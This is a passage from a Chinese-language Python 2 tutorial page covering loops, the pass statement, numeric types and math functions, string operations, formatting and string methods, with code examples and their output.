class="number">5</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">is</span> <span class="keyword">not</span> less than <span class="number">5</span></span><br></pre></td></tr></table></figure><h5 id="简单语句组"><a href="#简单语句组" class="headerlink" title="简单语句组"></a>简单语句组</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (flag): <span class="built_in">print</span> <span class="string">&#x27;Given flag is really true!&#x27;</span></span><br></pre></td></tr></table></figure><p>以上的无限循环可以使用 <strong>CTRL+C</strong> 来中断循环。</p><h4 id="for-循环语句"><a href="#for-循环语句" class="headerlink" title="for 循环语句"></a>for 循环语句</h4><p>for循环可以遍历任何序列的项目，如一个列表或者一个字符串。</p><p>语法格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> iterating_var <span class="keyword">in</span> sequence:</span><br><span class="line">   statements(s)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">&#x27;Python&#x27;</span>:     <span class="comment"># 第一个实例</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;当前字母: %s&quot;</span> % letter)</span><br><span class="line"> </span><br><span class="line">fruits = [<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>,  <span class="string">&#x27;mango&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> fruits:        <span class="comment"># 第二个实例</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&#x27;当前水果: %s&#x27;</span>% fruit)</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当前字母: P</span><br><span class="line">当前字母: y</span><br><span class="line">当前字母: t</span><br><span class="line">当前字母: h</span><br><span class="line">当前字母: o</span><br><span class="line">当前字母: n</span><br><span class="line">当前水果: banana</span><br><span class="line">当前水果: apple</span><br><span class="line">当前水果: mango</span><br></pre></td></tr></table></figure><h5 id="通过序列索引迭代"><a href="#通过序列索引迭代" class="headerlink" title="通过序列索引迭代"></a>通过序列索引迭代</h5><p>另外一种执行循环的遍历方式是通过索引，如下实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">fruits = [<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>,  <span class="string">&#x27;mango&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fruits)):</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&#x27;当前水果 : %s&#x27;</span> % fruits[index])</span><br></pre></td></tr></table></figure><p>以上实例输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当前水果 : banana</span><br><span class="line">当前水果 : apple</span><br><span class="line">当前水果 : mango</span><br></pre></td></tr></table></figure><p>以上实例我们使用了内置函数 len() 和 range(),函数 len() 返回列表的长度，即元素的个数。 range返回一个序列的数。</p><h5 id="循环使用-else-语句-1"><a href="#循环使用-else-语句-1" class="headerlink" title="循环使用 else 语句"></a>循环使用 else 语句</h5><p>在 python 中，for … else 表示这样的意思，for 中的语句和普通的没有区别，else 中的语句会在循环正常执行完（即 for 不是通过 break 跳出而中断的）的情况下执行，while … else 也是一样。</p><h4 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> iterating_var <span class="keyword">in</span> sequence:</span><br><span class="line">   <span class="keyword">for</span> iterating_var <span class="keyword">in</span> sequence:</span><br><span class="line">      statements(s)</span><br><span class="line">   statements(s)</span><br></pre></td></tr></table></figure><h4 id="pass-语句"><a href="#pass-语句" class="headerlink" title="pass 语句"></a>pass 语句</h4><p>pass 是空语句，是为了保持程序结构的完整性。</p><p><strong>pass</strong> 不做任何事情，一般用做占位语句。</p><p>Python 语言 pass 语句语法格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*- </span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 输出 Python 的每个字母</span></span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">&#x27;Python&#x27;</span>:</span><br><span class="line">   <span class="keyword">if</span> letter == <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;这是 pass 块&#x27;</span></span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;当前字母 :&#x27;</span>, letter</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">当前字母 : P</span><br><span class="line">当前字母 : y</span><br><span class="line">当前字母 : t</span><br><span class="line">这是 <span class="keyword">pass</span> 块</span><br><span class="line">当前字母 : h</span><br><span class="line">当前字母 : o</span><br><span class="line">当前字母 : n</span><br></pre></td></tr></table></figure><h3 id="Number-数据类型"><a href="#Number-数据类型" class="headerlink" title="Number 数据类型"></a>Number 数据类型</h3><p>Number 数据类型用于存储数值。数据类型是不允许改变的,这就意味着如果改变 Number 数据类型的值，将重新分配内存空间。</p><p>变量赋值时 Number 对象将被创建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 = <span class="number">1</span></span><br><span class="line">var2 = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>使用del语句删除一些 Number 对象引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> var1[,var2[,var3[....,varN]]]]</span><br></pre></td></tr></table></figure><p>del语句删除单个或多个对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> var</span><br><span class="line"><span class="keyword">del</span> var_a, var_b</span><br></pre></td></tr></table></figure><h4 id="math-模块、cmath-模块"><a href="#math-模块、cmath-模块" class="headerlink" title="math 模块、cmath 模块"></a>math 模块、cmath 模块</h4><p>Python math 模块提供了许多对浮点数的数学运算函数。</p><p>Python cmath 模块包含了一些用于复数运算的函数。</p><p>cmath 模块的函数跟 math 模块函数基本一致，区别是 cmath 模块运算的是复数，math 模块运算的是数学运算。</p><p>要使用 math 或 cmath 函数必须先导入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> cmath</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cmath.sqrt(-<span class="number">1</span>)</span><br><span class="line"><span class="number">1j</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cmath.sqrt(<span class="number">9</span>)</span><br><span class="line">(<span class="number">3</span>+<span class="number">0j</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cmath.sin(<span class="number">1</span>)</span><br><span class="line">(<span class="number">0.8414709848078965</span>+<span class="number">0j</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cmath.log10(<span class="number">100</span>)</span><br><span class="line">(<span class="number">2</span>+<span class="number">0j</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h4><table><thead><tr><th align="left">函数</th><th align="left">返回值 ( 描述 )</th></tr></thead><tbody><tr><td align="left">abs(x)</td><td align="left">返回数字的绝对值，如abs(-10) 返回 10</td></tr><tr><td align="left">ceil(x)]</td><td align="left">返回数字的上入整数，如math.ceil(4.1) 返回 5</td></tr><tr><td align="left">cmp(x, y)</td><td align="left">如果 x &lt; y 返回 -1, 如果 x &#x3D;&#x3D; y 返回 0, 如果 x &gt; y 返回 1</td></tr><tr><td align="left">exp(x)</td><td align="left"></td></tr><tr><td align="left">fabs(x)</td><td align="left">以浮点数形式返回数字的绝对值，如math.fabs(-10) 返回10.0</td></tr><tr><td align="left">floor(x)</td><td align="left">返回数字的下舍整数，如math.floor(4.9)返回 4</td></tr><tr><td align="left">log(x)</td><td align="left">如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td></tr><tr><td align="left">log10(x)</td><td align="left">返回以10为基数的x的对数，如math.log10(100)返回 2.0</td></tr><tr><td align="left">max(x1, x2,…)</td><td align="left">返回给定参数的最大值，参数可以为序列。</td></tr><tr><td align="left">min(x1, x2,…)</td><td align="left">返回给定参数的最小值，参数可以为序列。</td></tr><tr><td align="left">modf(x)</td><td align="left">返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td></tr><tr><td align="left">pow(x, y)</td><td align="left">x**y 运算后的值。</td></tr><tr><td align="left">round(x [,n])</td><td align="left">返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。</td></tr><tr><td align="left">sqrt(x)</td><td align="left">返回数字x的平方根</td></tr></tbody></table><h4 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h4><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">choice(seq)</td><td align="left">从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。</td></tr><tr><td align="left">randrange ([start,] stop [,step])</td><td align="left">从指定范围内，按指定基数递增的集合中获取一个随机数，基数默认值为 1</td></tr><tr><td align="left">random()</td><td align="left">随机生成下一个实数，它在[0,1)范围内。</td></tr><tr><td align="left">[seed([x])</td><td align="left">改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。</td></tr><tr><td align="left">shuffle(lst)</td><td align="left">将序列的所有元素随机排序</td></tr><tr><td align="left">uniform(x, y)</td><td align="left">随机生成下一个实数，它在[x,y]范围内。</td></tr></tbody></table><h4 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h4><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">acos(x)</td><td align="left">返回x的反余弦弧度值。</td></tr><tr><td align="left">asin(x)</td><td align="left">返回x的反正弦弧度值。</td></tr><tr><td align="left">atan(x)</td><td align="left">返回x的反正切弧度值。</td></tr><tr><td align="left">atan2(y, x)</td><td align="left">返回给定的 X 及 Y 坐标值的反正切值。</td></tr><tr><td align="left">cos(x)</td><td align="left">返回x的弧度的余弦值。</td></tr><tr><td align="left">hypot(x, y)</td><td align="left">返回欧几里德范数 sqrt(x<em>x + y</em>y)。</td></tr><tr><td align="left">sin(x)</td><td align="left">返回的x弧度的正弦值。</td></tr><tr><td align="left">tan(x)</td><td align="left">返回x弧度的正切值。</td></tr><tr><td align="left">degrees(x)</td><td align="left">将弧度转换为角度,如degrees(math.pi&#x2F;2) ， 返回90.0</td></tr><tr><td align="left">radians(x)</td><td align="left">将角度转换为弧度</td></tr></tbody></table><h4 id="数学常量"><a href="#数学常量" class="headerlink" title="数学常量"></a>数学常量</h4><table><thead><tr><th align="left">常量</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">pi</td><td align="left">数学常量 pi（圆周率，一般以π来表示）</td></tr><tr><td align="left">e</td><td align="left">数学常量 e，e即自然常数（自然常数）。</td></tr></tbody></table><h3 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h3><p>使用引号 ( <strong>‘</strong> 或 <strong>“</strong> ) 来创建字符串。创建字符串只要为变量分配一个值即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">var2 = <span class="string">&quot;Python&quot;</span></span><br></pre></td></tr></table></figure><p>不支持单字符类型，单字符在 Python 中也是作为一个字符串使用。</p><h4 id="访问子字符串"><a href="#访问子字符串" class="headerlink" title="访问子字符串"></a>访问子字符串</h4><p>可以使用方括号来截取字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">var1 = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">var2 = <span class="string">&quot;Python&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;var1[0]: &quot;</span>, var1[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;var2[1:5]: &quot;</span>, var2[<span class="number">1</span>:<span class="number">5</span>]</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1[<span class="number">0</span>]:  H</span><br><span class="line">var2[<span class="number">1</span>:<span class="number">5</span>]:  ytho</span><br></pre></td></tr></table></figure><h4 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">var1 = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;输出 :- &quot;</span>, var1[:<span class="number">6</span>] + <span class="string">&#x27;python!&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出 :-  Hello python!</span><br></pre></td></tr></table></figure><h4 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h4><table><thead><tr><th align="left">转义字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">(在行尾时)</td><td align="left">续行符</td></tr><tr><td align="left">\</td><td align="left">反斜杠符号</td></tr><tr><td align="left">&#39;</td><td align="left">单引号</td></tr><tr><td align="left">&quot;</td><td align="left">双引号</td></tr><tr><td align="left">\a</td><td align="left">响铃</td></tr><tr><td align="left">\b</td><td align="left">退格(Backspace)</td></tr><tr><td align="left">\e</td><td align="left">转义</td></tr><tr><td align="left">\000</td><td align="left">空</td></tr><tr><td align="left">\n</td><td align="left">换行</td></tr><tr><td align="left">\v</td><td align="left">纵向制表符</td></tr><tr><td align="left">\t</td><td align="left">横向制表符</td></tr><tr><td align="left">\r</td><td align="left">回车</td></tr><tr><td align="left">\f</td><td align="left">换页</td></tr><tr><td align="left">\oyy</td><td align="left">八进制数，y 代表 0~7 的字符，例如：\012 代表换行。</td></tr><tr><td align="left">\xyy</td><td align="left">十六进制数，以 \x 开头，yy代表的字符，例如：\x0a代表换行</td></tr><tr><td align="left">\other</td><td align="left">其它的字符以普通格式输出</td></tr></tbody></table><h4 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h4><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">字符串连接</td><td align="left">&gt;&gt;&gt;a + b ‘HelloPython’</td></tr><tr><td align="left">*</td><td align="left">重复输出字符串</td><td align="left">&gt;&gt;&gt;a * 2 ‘HelloHello’</td></tr><tr><td align="left">[]</td><td align="left">通过索引获取字符串中字符</td><td align="left">&gt;&gt;&gt;a[1] ‘e’</td></tr><tr><td align="left">[ : ]</td><td align="left">截取字符串中的一部分</td><td align="left">&gt;&gt;&gt;a[1:4] ‘ell’</td></tr><tr><td align="left">in</td><td align="left">成员运算符 - 如果字符串中包含给定的字符返回 True</td><td align="left">&gt;&gt;&gt;”H” in a True</td></tr><tr><td align="left">not in</td><td align="left">成员运算符 - 如果字符串中不包含给定的字符返回 True</td><td align="left">&gt;&gt;&gt;”M” not in a True</td></tr><tr><td align="left">r&#x2F;R</td><td align="left">原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母”r”（可以大小写）以外，与普通字符串有着几乎完全相同的语法。</td><td align="left">&gt;&gt;&gt;print r’\n’ \n &gt;&gt;&gt; print R’\n’ \n</td></tr><tr><td align="left">%</td><td align="left">格式字符串</td><td align="left">见下一节</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">a = <span class="string">&quot;Hello&quot;</span></span><br><span class="line">b = <span class="string">&quot;Python&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;a + b 输出结果：&quot;</span>, a + b </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;a * 2 输出结果：&quot;</span>, a * <span class="number">2</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;a[1] 输出结果：&quot;</span>, a[<span class="number">1</span>] </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;a[1:4] 输出结果：&quot;</span>, a[<span class="number">1</span>:<span class="number">4</span>] </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>( <span class="string">&quot;H&quot;</span> <span class="keyword">in</span> a) :</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;H 在变量 a 中&quot;</span> </span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;H 不在变量 a 中&quot;</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>( <span class="string">&quot;M&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> a) :</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;M 不在变量 a 中&quot;</span> </span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;M 在变量 a 中&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">r&#x27;\n&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">R&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a + b 输出结果： HelloPython</span><br><span class="line">a * <span class="number">2</span> 输出结果： HelloHello</span><br><span class="line">a[<span class="number">1</span>] 输出结果： e</span><br><span class="line">a[<span class="number">1</span>:<span class="number">4</span>] 输出结果： ell</span><br><span class="line">H 在变量 a 中</span><br><span class="line">M 不在变量 a 中</span><br><span class="line">\n</span><br><span class="line">\n</span><br></pre></td></tr></table></figure><h4 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h4><p>最基本的用法是将一个值插入到一个有字符串格式符 %s 的字符串中。字符串格式化使用与 C 中 sprintf 函数一样的语法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;My name is %s and weight is %d kg!&quot;</span> % (<span class="string">&#x27;Zara&#x27;</span>, <span class="number">21</span>) </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is Zara and weight is 21 kg!</span><br></pre></td></tr></table></figure><p>字符串格式化符号：</p><table><thead><tr><th align="left">符  号</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">%c</td><td align="left">格式化字符及其ASCII码</td></tr><tr><td align="left">%s</td><td align="left">格式化字符串</td></tr><tr><td align="left">%d</td><td align="left">格式化整数</td></tr></tbody></table><p>格式化操作符辅助指令:</p><table><thead><tr><th align="left">符号</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">定义宽度或者小数点精度</td></tr><tr><td align="left">-</td><td align="left">用做左对齐</td></tr><tr><td align="left">+</td><td align="left">在正数前面显示加号( + )</td></tr><tr><td align="left"><sp></td><td align="left">在正数前面显示空格</td></tr><tr><td align="left">#</td><td align="left">在八进制数前面显示零(‘0’)，在十六进制前面显示’0x’或者’0X’(取决于用的是’x’还是’X’)</td></tr><tr><td align="left">0</td><td align="left">显示的数字前面填充’0’而不是默认的空格</td></tr><tr><td align="left">%</td><td align="left">‘%%’输出一个单一的’%’</td></tr><tr><td align="left">(var)</td><td align="left">映射变量(字典参数)</td></tr><tr><td align="left">m.n.</td><td align="left">m 是显示的最小总宽度,n 是小数点后的位数(如果可用的话)</td></tr></tbody></table><h4 id="三引号"><a href="#三引号" class="headerlink" title="三引号"></a>三引号</h4><p>三引号可以将复杂的字符串进行赋值，允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符。语法是一对连续的单引号或者双引号（通常都是成对的用）。一个典型的用例是，当你需要一块HTML或者SQL时，这时当用三引号标记，使用传统的转义字符体系将十分费神。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> errHTML = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;</span></span><br><span class="line"><span class="string">Friends CGI Demo&lt;/TITLE&gt;&lt;/HEAD&gt;</span></span><br><span class="line"><span class="string">&lt;BODY&gt;&lt;H3&gt;ERROR&lt;/H3&gt;</span></span><br><span class="line"><span class="string">&lt;B&gt;%s&lt;/B&gt;&lt;P&gt;</span></span><br><span class="line"><span class="string">&lt;FORM&gt;&lt;INPUT TYPE=button VALUE=Back</span></span><br><span class="line"><span class="string">ONCLICK=&quot;window.history.back()&quot;&gt;&lt;/FORM&gt;</span></span><br><span class="line"><span class="string">&lt;/BODY&gt;&lt;/HTML&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cursor.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">CREATE TABLE users (  </span></span><br><span class="line"><span class="string">login VARCHAR(8), </span></span><br><span class="line"><span class="string">uid INTEGER,</span></span><br><span class="line"><span class="string">prid INTEGER)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="Unicode-字符串"><a href="#Unicode-字符串" class="headerlink" title="Unicode 字符串"></a>Unicode 字符串</h4><p>定义一个 Unicode 字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">u&#x27;Hello World !&#x27;</span></span><br><span class="line"><span class="string">u&#x27;Hello World !&#x27;</span></span><br></pre></td></tr></table></figure><p>如果想加入一个特殊字符，可以使用 Python 的 Unicode-Escape 编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">u&#x27;Hello\u0020World !&#x27;</span></span><br><span class="line"><span class="string">u&#x27;Hello World !&#x27;</span></span><br></pre></td></tr></table></figure><p> \u0020 标识表示在给定位置插入编码值为 0x0020 的 Unicode 字符（空格符）。</p><h4 id="字符串内建函数"><a href="#字符串内建函数" class="headerlink" title="字符串内建函数"></a>字符串内建函数</h4><p>字符串方法是从 Python1.6 到 2.0 慢慢加进来的 —— 它们也被加到了Jython 中。</p><p>这些方法实现了 string 模块的大部分方法，如下表所示列出了目前字符串内建支持的方法，所有的方法都包含了对 Unicode 的支持，有一些甚至是专门用于 Unicode 的。</p><table><thead><tr><th align="left"><strong>方法</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python/att-string-capitalize.html">string.capitalize()</a></td><td align="left">把字符串的第一个字符大写</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-center.html">string.center(width)</a></td><td align="left">返回一个原字符串居中,并使用空格填充至长度 width 的新字符串</td></tr><tr><td align="left"><strong><a href="https://www.runoob.com/python/att-string-count.html">string.count(str, beg&#x3D;0, end&#x3D;len(string))</a></strong></td><td align="left">返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-decode.html">string.decode(encoding&#x3D;’UTF-8’, errors&#x3D;’strict’)</a></td><td align="left">以 encoding 指定的编码格式解码 string，如果出错默认报一个 ValueError 的 异 常 ， 除非 errors 指 定 的 是 ‘ignore’ 或 者’replace’</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-encode.html">string.encode(encoding&#x3D;’UTF-8’, errors&#x3D;’strict’)</a></td><td align="left">以 encoding 指定的编码格式编码 string，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’</td></tr><tr><td align="left"><strong><a href="https://www.runoob.com/python/att-string-endswith.html">string.endswith(obj, beg&#x3D;0, end&#x3D;len(string))</a></strong></td><td align="left">检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False.</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-string-expandtabs.html">string.expandtabs(tabsize&#x3D;8)</a></td><td align="left">把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8。</td></tr><tr><td align="left"><strong><a href="https://www.runoob.com/python/att-string-find.html">string.find(str, beg&#x3D;0, end&#x3D;len(string))</a></strong></td><td align="left">检测 str 是否包含在 string 中，如果 beg 和 end 指定范围，则检查是否包含在指定范围内，如果是返回开始的索引值，否则返回-1</td></tr><tr><td align="left"><strong><a 